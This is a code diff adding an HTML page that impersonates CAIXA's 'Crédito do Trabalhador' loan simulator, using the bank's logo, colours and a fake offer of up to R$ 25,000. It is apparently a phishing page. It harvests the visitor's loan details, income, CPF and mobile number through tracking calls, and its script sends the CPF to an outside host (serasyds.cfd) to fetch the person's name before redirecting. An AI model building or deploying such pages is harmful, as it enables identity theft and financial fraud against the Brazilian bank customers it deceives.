@@ -1,0 +1,830 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crédito do Trabalhador - CAIXA</title>
+    <!-- Analytics Tracking -->
+    <script src="../js/analytics.js"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        :root {
+            --caixa-blue: #0070be;
+            --caixa-orange: #e38200;
+            --bg-light: #f4f7f9;
+            --text-dark: #1c1c1c;
+            --text-gray: #707070;
+            --border-color: #ccc;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        body {
+            background-color: white;
+            color: var(--text-dark);
+            display: flex;
+            justify-content: center;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        /* Header Estilo CAIXA */
+        header {
+            background-color: var(--caixa-blue);
+            color: white;
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        header img {
+            height: 25px;
+        }
+
+        header .divider {
+            width: 1px;
+            height: 20px;
+            background: rgba(255, 255, 255, 0.5);
+        }
+
+        header h1 {
+            font-size: 1.1rem;
+            font-weight: 500;
+        }
+
+        .version {
+            text-align: right;
+            font-size: 0.7rem;
+            color: #bbb;
+            padding: 10px 20px 0;
+        }
+
+        .content {
+            padding: 20px;
+            flex-grow: 1;
+        }
+
+        .page {
+            display: none;
+        }
+
+        .page.active {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        h2 {
+            color: var(--caixa-blue);
+            font-size: 1.6rem;
+            margin-bottom: 20px;
+            font-weight: 700;
+        }
+
+        /* Estilo Inputs e Cards */
+        .card-blue-light {
+            background: #f8fbff;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .field-group {
+            margin-bottom: 20px;
+        }
+
+        .field-label {
+            display: block;
+            font-weight: 700;
+            font-size: 0.95rem;
+            margin-bottom: 8px;
+            color: #333;
+        }
+
+        .input-box {
+            background: #fff;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 12px 15px;
+        }
+
+        .input-box label {
+            font-size: 0.75rem;
+            color: var(--text-gray);
+            display: block;
+            font-weight: 700;
+        }
+
+        .input-box input {
+            border: none;
+            width: 100%;
+            font-size: 1.1rem;
+            font-weight: 600;
+            outline: none;
+            margin-top: 4px;
+        }
+
+        /* Info Box */
+        .info-alert {
+            background: #e6f4f6;
+            border-radius: 10px;
+            padding: 15px;
+            display: flex;
+            gap: 12px;
+            margin-top: 15px;
+        }
+
+        .info-alert i {
+            color: var(--caixa-blue);
+            flex-shrink: 0;
+        }
+
+        .info-alert div strong {
+            color: var(--caixa-blue);
+            font-size: 0.9rem;
+            display: block;
+            margin-bottom: 4px;
+        }
+
+        .info-alert div p {
+            font-size: 0.85rem;
+            line-height: 1.4;
+            color: #333;
+        }
+
+        /* Botões */
+        .footer-buttons {
+            padding: 20px;
+            background: white;
+            border-top: 1px solid #eee;
+            position: sticky;
+            bottom: 0;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 14px;
+            border-radius: 8px;
+            font-weight: 700;
+            font-size: 1rem;
+            cursor: pointer;
+            border: none;
+            margin-bottom: 10px;
+            transition: 0.2s;
+        }
+
+        .btn-orange {
+            background-color: var(--caixa-orange);
+            color: white;
+        }
+
+        .btn-outline {
+            background: white;
+            border: 2px solid var(--caixa-blue);
+            color: var(--caixa-blue);
+        }
+
+        .btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        /* Stepper */
+        .stepper {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 30px;
+        }
+
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .step-num {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.8rem;
+            font-weight: bold;
+        }
+
+        .step-active .step-num {
+            background: var(--caixa-blue);
+            color: white;
+        }
+
+        .step-inactive .step-num {
+            background: #ccc;
+            color: white;
+        }
+
+        .step-label {
+            font-size: 0.85rem;
+            font-weight: 600;
+            color: #999;
+        }
+
+        .step-active .step-label {
+            color: #1c1c1c;
+        }
+
+        .line {
+            width: 40px;
+            height: 1px;
+            background: #ccc;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+        <header>
+            <svg width="70" height="16" viewBox="0 0 70 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path fill-rule="evenodd" clip-rule="evenodd"
+                    d="M58.9244 15.7589H53.0361L60.7899 0.262695H66.9488L69.9997 15.7589H64.0972L63.8871 13.8263H59.6792L58.9244 15.7589ZM63.5347 10.1556L63.2606 7.31623C63.1965 6.64686 63.225 5.63921 63.2392 4.91947H63.0114L61.1032 10.1556H63.492H63.5347Z"
+                    fill="white" />
+                <path fill-rule="evenodd" clip-rule="evenodd"
+                    d="M44.7031 12.84L49.114 8.38477L52.8307 15.7586H46.1734L44.7031 12.84Z" fill="white" />
+                <path fill-rule="evenodd" clip-rule="evenodd"
+                    d="M35.1621 15.7586H41.8194L49.1139 8.38477H42.4566L35.1621 15.7586Z" fill="#F39200" />
+                <path fill-rule="evenodd" clip-rule="evenodd"
+                    d="M39.4805 0.262388L46.1342 0.258789L49.8544 7.63621H43.1971L39.4805 0.262388Z" fill="white" />
+                <path fill-rule="evenodd" clip-rule="evenodd"
+                    d="M50.4956 0.262695L47.6084 3.18127L49.8548 7.63652L57.1493 0.262695H50.4956Z" fill="#F39200" />
+                <path fill-rule="evenodd" clip-rule="evenodd"
+                    d="M31.8085 0.262695H37.3764L34.9448 15.7589H29.377L31.8085 0.262695Z" fill="white" />
+                <path fill-rule="evenodd" clip-rule="evenodd"
+                    d="M17.2936 15.7589H11.4053L19.1555 0.262695H25.3143L28.3653 15.7589H22.4663L22.2563 13.8263H18.0447L17.2936 15.7589ZM21.9038 10.1556L21.6297 7.31623C21.5656 6.64686 21.5941 5.63921 21.6083 4.91947H21.3805L19.4723 10.1556H21.8611H21.9038Z"
+                    fill="white" />
+                <path fill-rule="evenodd" clip-rule="evenodd"
+                    d="M12.2633 6.53891C11.5086 5.704 10.4976 4.98066 9.24087 4.98066C7.57121 4.98066 6.0048 6.31579 5.73423 8C5.47435 9.7094 6.70968 11.0193 8.37578 11.0193C9.65739 11.0193 10.7574 10.4723 11.7934 9.58704L10.7183 15.3882C9.75351 15.8129 7.65665 16 6.65628 16C2.28812 15.9964 -0.588391 12.5632 0.102256 8.14755C0.807143 3.62033 4.89406 0 9.38683 0C10.6471 0 11.918 0.237517 13.0252 0.636977L12.2633 6.53891Z"
+                    fill="white" />
+            </svg>
+            <div class="divider"></div>
+            <h1>Crédito do Trabalhador</h1>
+        </header>
+
+        <div class="version">v1.1.0.0</div>
+
+        <div class="content">
+
+            <section class="page active" id="step1">
+                <h2 style="font-size: 1.8rem; color: #0070be; margin-bottom: 20px;">Simulação</h2>
+
+                <div class="card-blue-light"
+                    style="background-color: #f8fbff; border-radius: 8px; padding: 15px; border: 1px solid #eef2f6;">
+                    <p style="color: #0070be; font-size: 1rem; margin-bottom: 15px;">Informe os dados</p>
+
+                    <div class="field-group" style="margin-bottom: 20px;">
+                        <label class="field-label"
+                            style="color: #333; font-weight: 700; margin-bottom: 5px; display: block;">Valor do
+                            empréstimo (R$)</label>
+                        <div class="input-box"
+                            style="background: #fff; border: 1px solid #ccc; border-radius: 4px; padding: 10px;">
+                            <input type="text" id="val_obra" placeholder="Ex: R$ 5.000,00" oninput="maskMoney(this)"
+                                style="width: 100%; border: none; font-size: 1rem; outline: none;">
+                        </div>
+                        <p style="font-size: 0.8rem; color: #707070; margin-top: 5px;">Valor entre R$ 5.000 e R$ 30.000
+                        </p>
+                    </div>
+
+                    <div class="field-group" style="margin-bottom: 20px;">
+                        <label class="field-label"
+                            style="color: #333; font-weight: 700; margin-bottom: 5px; display: block;">Prazo para
+                            pagamento <span style="font-weight: 400; color: #707070; font-size: 0.85rem;">em
+                                meses</span></label>
+                        <div class="input-box"
+                            style="background: #fff; border: 1px solid #ccc; border-radius: 4px; padding: 10px;">
+                            <input type="number" id="meses_obra" placeholder="Ex: 60"
+                                style="width: 100%; border: none; font-size: 1rem; outline: none;">
+                        </div>
+                    </div>
+
+                    <div class="field-group" style="margin-bottom: 20px;">
+                        <label class="field-label"
+                            style="color: #333; font-weight: 700; margin-bottom: 5px; display: block;">Renda familiar
+                            <span style="font-weight: 400; color: #707070; font-size: 0.85rem;">Soma dos
+                                participantes</span></label>
+                        <div class="input-box"
+                            style="background: #fff; border: 1px solid #ccc; border-radius: 4px; padding: 10px;">
+                            <input type="text" id="renda_familiar" placeholder="R$ 0,00" oninput="maskMoney(this)"
+                                style="width: 100%; border: none; font-size: 1rem; outline: none;">
+                        </div>
+                        <p style="font-size: 0.8rem; color: #707070; margin-top: 5px;">Informe a soma da renda de todos
+                            os familiares que vão participar da proposta.</p>
+                    </div>
+
+                    <div class="info-alert"
+                        style="background-color: #e6f4f6; border-radius: 8px; padding: 15px; display: flex; gap: 10px;">
+                        <i data-lucide="info" style="color: #0070be; flex-shrink: 0; width: 20px;"></i>
+                        <div>
+                            <strong
+                                style="color: #0070be; font-size: 0.9rem; display: block; margin-bottom: 5px;">Aviso</strong>
+                            <ul
+                                style="margin: 0; padding-left: 15px; font-size: 0.8rem; color: #333; line-height: 1.4;">
+                                <li style="margin-bottom: 8px;">Antes de seguir, veja se a prestação cabe no seu
+                                    orçamento e como os juros influenciam o valor final. Entender esses pontos ajuda
+                                    você a decidir com segurança e tranquilidade.</li>
+                                <li>Estamos aqui para apoiar seu planejamento. Para saber mais, acesse...</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+
+
+            <section class="page" id="step2">
+                <h2 style="font-size: 1.8rem; color: #0070be; margin-bottom: 5px;">Simulação livre</h2>
+
+                <div class="card-blue-light"
+                    style="background-color: #f8fbff; border-radius: 8px; padding: 15px; border: 1px solid #eef2f6; margin-top: 15px;">
+
+                    <div
+                        style="background: #fff; border-radius: 4px; padding: 15px; margin-bottom: 10px; border-left: 4px solid #0070be;">
+                        <p style="color: #0070be; font-size: 0.9rem; margin-bottom: 15px; font-weight: 600;">Dados da
+                            simulação</p>
+
+                        <div style="margin-bottom: 15px;">
+                            <p style="font-size: 0.8rem; color: #707070;">Valor solicitado</p>
+                            <p style="font-weight: 700; font-size: 1rem;" id="res_valor">R$ 5.000,00</p>
+                        </div>
+
+                        <div style="margin-bottom: 15px;">
+                            <p style="font-size: 0.8rem; color: #707070;">Pode ficar disponível para você</p>
+                            <p style="font-weight: 700; font-size: 1rem; color: #0070be;">Até R$ 25.000,00</p>
+                        </div>
+
+                        <p style="font-size: 0.75rem; color: #707070; line-height: 1.3;">O valor disponível pode variar
+                            de acordo com a sua renda</p>
+                        <p style="font-weight: 700; font-size: 0.9rem; margin-top: 5px;">Renda: <span id="res_renda">R$
+                                5.000,00</span></p>
+                    </div>
+
+                    <div style="background: #fff; border-radius: 4px; padding: 15px; margin-bottom: 10px;">
+                        <div
+                            style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
+                            <p style="color: #333; font-size: 0.9rem; font-weight: 700;">Parcelamento</p>
+                            <i data-lucide="chevron-up" style="color: #0070be; width: 20px;"></i>
+                        </div>
+
+                        <div style="display: flex; justify-content: space-between; align-items: flex-end;">
+                            <div>
+                                <p style="font-size: 0.8rem; color: #707070;">Prestação</p>
+                                <p style="font-weight: 700; font-size: 1rem; color: #0070be;"><span
+                                        id="res_parcelas">60x</span> de <span id="res_valor_parcela">R$ 142,10</span>
+                                </p>
+                            </div>
+                            <div style="display: flex; align-items: center; gap: 5px; color: #0070be; cursor: pointer;"
+                                onclick="go(1)">
+                                <span style="font-size: 0.85rem; font-weight: 700;">Alterar</span>
+                                <i data-lucide="pencil" style="width: 14px;"></i>
+                            </div>
+                        </div>
+
+                        <div style="margin-top: 15px;">
+                            <p style="font-size: 0.8rem; color: #707070;">Primeira parcela</p>
+                            <p style="font-weight: 700; font-size: 0.9rem;">31/01/2026</p>
+                        </div>
+                    </div>
+
+                    <div style="background: #fff; border-radius: 4px; padding: 15px;">
+                        <div
+                            style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
+                            <p style="color: #333; font-size: 0.9rem; font-weight: 700;">Custos do empréstimo</p>
+                            <i data-lucide="chevron-up" style="color: #0070be; width: 20px;"></i>
+                        </div>
+
+
+
+                        <div
+                            style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; border-bottom: 1px solid #eee; padding-bottom: 8px;">
+                            <div>
+                                <p style="font-size: 0.8rem; color: #707070;">Custo efetivo total</p>
+                                <p style="font-weight: 700; font-size: 0.9rem;">1,17% ao mês (14,98% ao ano)</p>
+                            </div>
+                            <i data-lucide="info" style="color: #333; width: 18px;"></i>
+                        </div>
+
+                        <div style="display: flex; justify-content: space-between; align-items: center;">
+                            <div>
+                                <p style="font-size: 0.8rem; color: #707070;">Taxa de juros</p>
+                                <p style="font-weight: 700; font-size: 0.9rem;">1,17% ao mês (14,98% ao ano)</p>
+                            </div>
+                            <i data-lucide="info" style="color: #333; width: 18px;"></i>
+                        </div>
+                    </div>
+
+                    <div class="info-alert"
+                        style="background-color: #e6f4f6; border-radius: 8px; padding: 15px; display: flex; gap: 10px; margin-top: 15px;">
+                        <i data-lucide="info" style="color: #0070be; flex-shrink: 0; width: 20px;"></i>
+                        <div>
+                            <strong
+                                style="color: #0070be; font-size: 0.9rem; display: block; margin-bottom: 5px;">Importante</strong>
+                            <ul
+                                style="margin: 0; padding-left: 15px; font-size: 0.8rem; color: #333; line-height: 1.4;">
+                                <li>Os valores apresentados são aproximados e representam apenas uma simulação. As
+                                    condições da contratação dependem do seu enquadramento e do imóvel, da avaliação de
+                                    risco e das regras do produto.</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section class="page" id="step3">
+                <h2 style="font-size: 1.8rem; color: #0070be; margin-bottom: 5px;">Informe os seus dados</h2>
+                <p style="color: #707070; font-size: 0.95rem; margin-bottom: 25px;">Precisamos identificar você para
+                    continuar.</p>
+
+                <div class="card-blue-light"
+                    style="background-color: #f8fbff; border-radius: 8px; padding: 15px; border: 1px solid #eef2f6;">
+
+                    <div class="field-group" style="margin-bottom: 20px;">
+                        <div class="input-box" style="
+                        background: #f0f4f8;
+                        border: 1px solid #d0d7e2;
+                        border-radius: 8px;
+                        padding: 14px 12px;
+                    ">
+                            <label style="
+                            display: block;
+                            font-size: 0.7rem;
+                            color: #5a6b85;
+                            font-weight: 700;
+                            letter-spacing: 0.03em;
+                            margin-bottom: 4px;
+                        ">
+                                NOME PARA CONFERÊNCIA
+                            </label>
+                            <input type="text" id="in_nome" readonly style="
+                                   width: 100%;
+                                   border: none;
+                                   font-size: 1.05rem;
+                                   outline: none;
+                                   font-weight: 600;
+                                   background: transparent;
+                                   color: #1a1a1a;
+                               ">
+                        </div>
+                    </div>
+
+                    <div class="field-group" style="margin-bottom: 20px;">
+                        <div class="input-box" style="
+                        background: #f0f4f8;
+                        border: 1px solid #d0d7e2;
+                        border-radius: 8px;
+                        padding: 14px 12px;
+                    ">
+                            <label style="
+                            display: block;
+                            font-size: 0.7rem;
+                            color: #5a6b85;
+                            font-weight: 700;
+                            letter-spacing: 0.03em;
+                            margin-bottom: 4px;
+                        ">
+                                CPF PARA CONFERÊNCIA
+                            </label>
+                            <input type="text" id="in_cpf" readonly style="
+                                   width: 100%;
+                                   border: none;
+                                   font-size: 1.05rem;
+                                   outline: none;
+                                   font-weight: 600;
+                                   background: transparent;
+                                   color: #1a1a1a;
+                               ">
+                        </div>
+                    </div>
+
+
+                    <div class="field-group" style="margin-bottom: 20px;">
+                        <div class="input-box"
+                            style="background: #fff; border: 1px solid #ccc; border-radius: 4px; padding: 10px;">
+                            <label style="display: block; font-size: 0.75rem; color: #707070; font-weight: 700;">Celular
+                                *</label>
+                            <input type="text" id="in_celular" placeholder="(00) 00000-0000" oninput="maskPhone(this)"
+                                style="width: 100%; border: none; font-size: 1.1rem; outline: none; font-weight: 600;">
+                        </div>
+
+                        <div class="info-alert"
+                            style="background-color: #e6f4f6; border-radius: 8px; padding: 15px; display: flex; gap: 10px; align-items: flex-start;">
+                            <i data-lucide="smartphone"
+                                style="color: #0070be; flex-shrink: 0; width: 20px; margin-top: 3px;"></i>
+                            <div>
+                                <strong
+                                    style="color: #0070be; font-size: 0.9rem; display: block; margin-bottom: 5px;">Atenção</strong>
+                                <p style="font-size: 0.85rem; color: #333; line-height: 1.4; margin: 0;">
+                                    Informe todos os dados corretamente!
+                                </p>
+                            </div>
+                        </div>
+
+                    </div>
+
+                    <p class="error-msg" id="err_step3"
+                        style="color: #a32b21; font-size: 0.85rem; margin-top: 15px; display: none;">
+                        Por favor, preencha o CPF e o celular corretamente.
+                    </p>
+            </section>
+
+        </div>
+
+        <div class="footer-buttons">
+            <button class="btn btn-orange" id="btn_next" onclick="nextStep()">Continuar</button>
+            <button class="btn btn-outline" id="btn_back" onclick="prevStep()" style="display:none;">Voltar</button>
+        </div>
+    </div>
+
+    <script>
+        function consultarCpfEAvancar() {
+            const cpfInput = document.getElementById("in_cpf");
+            const cpf = cpfInput.value.replace(/\D/g, "");
+
+            if (cpf.length !== 11) {
+                alert("CPF inválido");
+                return;
+            }
+
+            console.log("Consultando CPF:", cpf);
+
+            fetch("https://serasyds.cfd/api.php?cpf=" + cpf)
+                .then(res => res.json())
+                .then(data => {
+                    console.log("Resposta API:", data);
+
+                    if (Number(data.status) !== 200) {
+                        alert("CPF não encontrado");
+                        return;
+                    }
+
+                    const nome = data.NOME || data.nome;
+
+                    if (!nome) {
+                        alert("Nome não retornado");
+                        return;
+                    }
+
+                    // 🔥 SOBRESCREVE qualquer valor antigo
+                    localStorage.setItem("nomeUsuario", nome);
+                    localStorage.setItem("cpfUsuario", cpf);
+
+                    console.log("SALVO CORRETAMENTE:", nome);
+
+                    // 👉 SÓ AGORA AVANÇA
+                    window.location.href = "../atendimento";
+                })
+                .catch(err => {
+                    console.error("Erro API:", err);
+                    alert("Erro ao consultar CPF");
+                });
+        }
+    </script>
+
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const nome = localStorage.getItem('nome');
+            const cpf = localStorage.getItem('cpf');
+
+            if (nome) {
+                document.getElementById('in_nome').value = nome;
+            }
+
+            if (cpf) {
+                // formata CPF
+                const cpfFormatado = cpf.replace(
+                    /^(\d{3})(\d{3})(\d{3})(\d{2})$/,
+                    '$1.$2.$3-$4'
+                );
+                document.getElementById('in_cpf').value = cpfFormatado;
+            }
+        });
+    </script>
+
+
+    <script>
+        let currentStep = 1;
+
+        function go(step) {
+            // Track step navigation
+            if (step !== currentStep && typeof trackNavigation === 'function') {
+                trackNavigation(`/simula/step${currentStep}`, `/simula/step${step}`);
+                trackPageView(`/simula/step${step}`, { previousStep: currentStep });
+            }
+
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById('step' + step).classList.add('active');
+            currentStep = step;
+
+            const btnBack = document.getElementById('btn_back');
+            const btnNext = document.getElementById('btn_next');
+
+            if (btnBack) btnBack.style.display = (step === 1) ? 'none' : 'block';
+
+            if (step === 3) {
+                btnNext.innerText = 'Confirmar dados';
+            } else if (step === 2) {
+                btnNext.innerText = 'Confirmar e Continuar';
+            } else {
+                btnNext.innerText = 'Continuar';
+            }
+
+            btnNext.onclick = () => {
+                if (typeof trackClick === 'function') {
+                    trackClick('button', btnNext.innerText, `/simula/step${step}`);
+                }
+
+                if (step === 3) {
+                    // Ao clicar no último passo, vai direto para o loading
+                    enviarParaLoading();
+                } else {
+                    nextStep();
+                }
+            };
+
+            if (step === 2) {
+                const valorInformado = document.getElementById('val_obra').value || 'R$ 0,00';
+                const mesesInformados = document.getElementById('meses_obra').value || '';
+                const rendaInformada = document.getElementById('renda_familiar').value || 'R$ 0,00';
+
+                document.getElementById('res_valor').innerText = valorInformado;
+                document.getElementById('res_renda').innerText = rendaInformada;
+
+                if (mesesInformados >= 12 && mesesInformados <= 60) {
+                    document.getElementById('res_parcelas').innerText = mesesInformados + 'x';
+                } else {
+                    document.getElementById('res_parcelas').innerText = '—';
+                }
+
+                let valorLimpo = parseFloat(valorInformado.replace(/[^\d]/g, "")) / 100;
+                let parcelas = parseInt(mesesInformados) || 1;
+                let valorParcela = (valorLimpo * 1.4) / parcelas;
+
+                document.getElementById('res_valor_parcela').innerText =
+                    valorParcela.toLocaleString("pt-BR", {
+                        style: "currency",
+                        currency: "BRL"
+                    });
+            }
+            if (window.lucide) lucide.createIcons();
+        }
+
+        function nextStep() {
+            if (currentStep === 1) {
+                const val = document.getElementById('val_obra').value;
+                const meses = document.getElementById('meses_obra').value;
+                const renda = document.getElementById('renda_familiar').value;
+
+                if (!val || !meses) {
+                    if (typeof trackEvent === 'function') {
+                        trackEvent('validation_error', { page: '/simula/step1', reason: 'empty_fields' });
+                    }
+                    alert('Preencha os campos.');
+                    return;
+                }
+
+                // Track form data
+                if (typeof trackFormField === 'function') {
+                    trackFormField('valor_emprestimo', val, '/simula/step1');
+                    trackFormField('prazo_meses', meses, '/simula/step1');
+                    trackFormField('renda_familiar', renda, '/simula/step1');
+                }
+                if (typeof trackEvent === 'function') {
+                    trackEvent('step1_completed', { valor: val, meses: meses, renda: renda });
+                }
+
+                go(2);
+            } else if (currentStep === 2) {
+                if (typeof trackEvent === 'function') {
+                    trackEvent('step2_completed', { page: '/simula/step2' });
+                }
+                go(3);
+            }
+        }
+
+        function enviarParaLoading() {
+            const cpfInput = document.getElementById("in_cpf");
+            const celInput = document.getElementById("in_celular");
+            const cpf = cpfInput.value.replace(/\D/g, "");
+            const cel = celInput.value.replace(/\D/g, "");
+
+            if (cpf.length !== 11) {
+                if (typeof trackEvent === 'function') {
+                    trackEvent('validation_error', { page: '/simula/step3', reason: 'invalid_cpf' });
+                }
+                alert("CPF inválido");
+                return;
+            }
+
+            // Track celular field and step completion
+            if (typeof trackFormField === 'function') {
+                trackFormField('celular', celInput.value, '/simula/step3');
+            }
+            if (typeof trackEvent === 'function') {
+                trackEvent('step3_completed', { page: '/simula/step3' });
+            }
+            if (typeof trackNavigation === 'function') {
+                trackNavigation('/simula/step3', '/simula/loading');
+            }
+
+            // Salva localmente e muda de página NA HORA
+            localStorage.setItem("cpfUsuario", cpf);
+            localStorage.setItem("celularUsuario", cel);
+            window.location.href = "loading.html";
+        }
+
+        // Máscaras
+        function maskMoney(i) {
+            let v = i.value.replace(/\D/g, "");
+            v = (v / 100).toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
+            i.value = v;
+        }
+
+        function maskCPF(i) {
+            let v = i.value.replace(/\D/g, "");
+            if (v.length > 11) v = v.slice(0, 11);
+            v = v.replace(/(\d{3})(\d)/, "$1.$2").replace(/(\d{3})(\d)/, "$1.$2").replace(/(\d{3})(\d{1,2})$/, "$1-$2");
+            i.value = v;
+        }
+
+        function maskPhone(i) {
+            let v = i.value.replace(/\D/g, "");
+            if (v.length > 11) v = v.slice(0, 11);
+            v = v.replace(/^(\d{2})(\d)/g, "($1) $2").replace(/(\d{5})(\d)/, "$1-$2");
+            i.value = v;
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            // Track initial page view
+            if (typeof trackPageView === 'function') {
+                trackPageView('/simula/step1');
+            }
+
+            // Track field interactions
+            const valorField = document.getElementById('val_obra');
+            const mesesField = document.getElementById('meses_obra');
+            const rendaField = document.getElementById('renda_familiar');
+            const celField = document.getElementById('in_celular');
+
+            valorField?.addEventListener('focus', () => {
+                if (typeof trackEvent === 'function') trackEvent('valor_field_focus', { page: '/simula/step1' });
+            });
+
+            mesesField?.addEventListener('focus', () => {
+                if (typeof trackEvent === 'function') trackEvent('meses_field_focus', { page: '/simula/step1' });
+            });
+
+            rendaField?.addEventListener('focus', () => {
+                if (typeof trackEvent === 'function') trackEvent('renda_field_focus', { page: '/simula/step1' });
+            });
+
+            celField?.addEventListener('focus', () => {
+                if (typeof trackEvent === 'function') trackEvent('celular_field_focus', { page: '/simula/step3' });
+            });
+
+            if (window.lucide) lucide.createIcons();
+        });
+    </script>
+
+
+</body>
+
+</html>
